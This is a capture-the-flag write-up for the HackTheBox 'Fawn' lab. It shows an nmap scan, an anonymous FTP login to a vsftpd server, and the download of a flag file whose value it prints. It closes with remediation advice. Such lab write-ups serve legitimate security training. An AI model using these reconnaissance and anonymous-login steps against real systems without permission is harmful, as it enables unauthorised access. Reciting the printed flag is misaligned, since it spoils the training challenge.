# Fawn — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-0-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-FTP%20(21)%20anon-red)

> **Target:** `10.129.x.x`
> **Foothold:** **Anonymous FTP** login on `21/tcp` — the flag is downloadable directly.

---

## 🧭 Overview

A single **FTP** service (`21/tcp`, vsftpd 3.0.3) permitted **anonymous** login. With no
authentication required, `flag.txt` was listed in the FTP root and downloaded directly.

---

## 1. Reconnaissance

```bash
nmap -sV -sC 10.129.x.x
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

FTP transmits credentials and data in cleartext; "anonymous FTP" means no account is needed
at all.

---

## 2. Foothold — Anonymous FTP

```bash
ftp 10.129.x.x
```

Log in with username **`anonymous`** and a **blank password**:

```text
Name: anonymous
331 Please specify the password.
Password:
230 Login successful.
```

`230 Login successful.` confirms anonymous access. List and download the flag:

```bash
ftp> ls
# -rw-r--r--    1 0   0   32 ... flag.txt
ftp> get flag.txt
ftp> exit
```

---

## 3. Flag

```bash
cat flag.txt
```

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
035db21c881520061c53e0536e44f815
```
</details>

---

## 🛡️ Lessons / Remediation
- **Disable anonymous FTP** unless a public read-only drop is genuinely intended.
- Prefer **SFTP/FTPS** so credentials and data are encrypted in transit.
- Do not store sensitive files in an anonymously accessible directory.
